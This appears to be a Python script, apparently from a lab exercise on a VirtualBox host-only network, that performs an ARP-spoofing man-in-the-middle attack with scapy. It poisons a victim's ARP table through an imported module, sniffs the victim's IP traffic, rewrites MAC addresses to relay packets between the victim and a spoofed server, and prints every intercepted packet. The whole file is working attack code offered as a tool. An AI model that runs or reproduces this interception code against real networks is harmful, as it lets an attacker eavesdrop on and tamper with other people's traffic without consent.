from time import sleep

from scapy.all import *
from scapy.layers.inet import IP, TCP
import threading
from threading import Lock
import arpSpoof
import util

lock = Lock()
networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.102"
#serverMAC = "08:00:27:c6:a4:61"

#array for saving intersepted packets
interceptedPkt = []


# input : attacker MAC as str
# -target ip which has posioned arp tables  as str
# - array of ips which were posioned in victim table as array of str
# - network interface as str
# output:
# - send replay packet which will perform MIMA as follows
# - attacker will receive request from victim ip
# - performe that request and receive response from dst ip
# - and then send that resposne to the victim ip

class sniffer():
    def __init__(self, networkInterface, victimIP, spoofIP, attackerMAC):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofIP = spoofIP
        self.attackerMAC = attackerMAC
        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
        self.interceptedPkt = []

    def startSniff(self):
        sniff(prn=self.intercept, iface=networkInterface, filter="ip", timeout = 20)

    def intercept(self, pkt):

        #update intercepted packet list
        self.interceptedPkt.append(pkt)

        #print("I got here")
        #case 1: victim request an IP which has as destination MAC of attacker
        # find corresponding MAC to that IP in array of spoffed IPs and
        # put as destination to the new packet
        print(pkt.show())
        if pkt[Ether].dst == self.attackerMAC :
            if pkt[IP].dst in  spoofIP:
                pkt[Ether].dst = self.serverMAC[spoofIP.index(pkt[IP].dst)]
            else:
            #case 2: server response for the request of the victim
            #so replace destination MAC to the MAC of victim
                pkt[Ether].dst = self.victimMAC

            #put src to attackerMAC as both arp tables of server and victim
            #maintain requested IP andresses under attacker MAC
            pkt[Ether].src = self.attackerMAC

            # send packet to the network
            sendp(pkt, iface=networkInterface)
            print(pkt.show())

    def spoof(self):
        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)

    def start(self):
        while (True):
            test.spoof()
            test.startSniff()

test = sniffer(networkInterface, [victimIP], [spoofIP], get_if_hwaddr(networkInterface))

test.start()
